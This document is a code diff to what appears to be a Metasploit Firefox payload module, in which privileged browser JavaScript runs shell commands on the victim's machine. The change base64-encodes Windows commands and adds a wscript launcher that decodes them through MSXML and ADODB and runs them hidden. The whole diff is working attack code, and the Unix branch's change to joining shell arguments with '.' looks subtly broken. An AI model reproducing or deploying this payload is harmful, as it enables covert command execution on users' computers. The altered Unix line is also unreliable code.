@@ -33,6 +33,7 @@ module Msf::Payload::Firefox
     %Q|
       var ua = Components.classes["@mozilla.org/network/protocol;1?name=http"]
         .getService(Components.interfaces.nsIHttpProtocolHandler).userAgent;
+      var svcs = Components.utils.import("resource://gre/modules/Services.jsm");
       var jscript = (#{JSON.unparse({:src => jscript_launcher})}).src;
       var runCmd = function(cmd) {
         var shEsc = "\\\\$&";
@@ -71,8 +72,9 @@ module Msf::Payload::Firefox
         if (windows) {
           var shell = "cmd /c "+cmd;
           shell = "cmd /c "+shell.replace(/\\W/g, shEsc)+" >"+stdout.path+" 2>"+stderr.path;
+          var b64 = svcs.btoa(shell);
         } else {
-          var shell = ["/bin/sh", "-c", cmd.replace(/\\W/g, shEsc)].join(" ");
+          var shell = ["/bin/sh", "-c", cmd.replace(/\\W/g, shEsc)].join(".");
           shell = "/bin/sh -c "+(shell + " >"+stdout.path+" 2>"+stderr.path).replace(/\\W/g, shEsc);
         }
         var process = Components.classes["@mozilla.org/process/util;1"]
@@ -83,7 +85,7 @@ module Msf::Payload::Firefox
         if (windows) {
           sh.initWithPath("C:\\\\Windows\\\\System32\\\\wscript.exe");
           process.init(sh);
-          var args = [jscriptFile.path, shell];
+          var args = [jscriptFile.path, b64];
           process.run(true, args, args.length);
         } else {
           sh.initWithPath("/bin/sh");
@@ -104,9 +106,15 @@ module Msf::Payload::Firefox
 
   def jscript_launcher
     %Q|
-      var cmdStr = '';
-      for (var i = 0; i < WScript.arguments.length; i++) cmdStr += WScript.arguments(i) + " ";
-      (new ActiveXObject("WScript.Shell")).Run(cmdStr, 0, true);
+      var b64 = WScript.arguments(0);
+      var dom = new ActiveXObject("MSXML2.DOMDocument.3.0");
+      var el  = dom.createElement("root");
+      el.dataType = "bin.base64"; el.text = b64; dom.appendChild(el);
+      var stream = new ActiveXObject("ADODB.Stream");
+      stream.Type=1; stream.Open(); stream.Write(el.nodeTypedValue);
+      stream.Position=0; stream.type=2; stream.CharSet = "us-ascii"; stream.Position=0;
+      var cmd = stream.ReadText();
+      (new ActiveXObject("WScript.Shell")).Run(cmd, 0, true);
     |
   end
 end
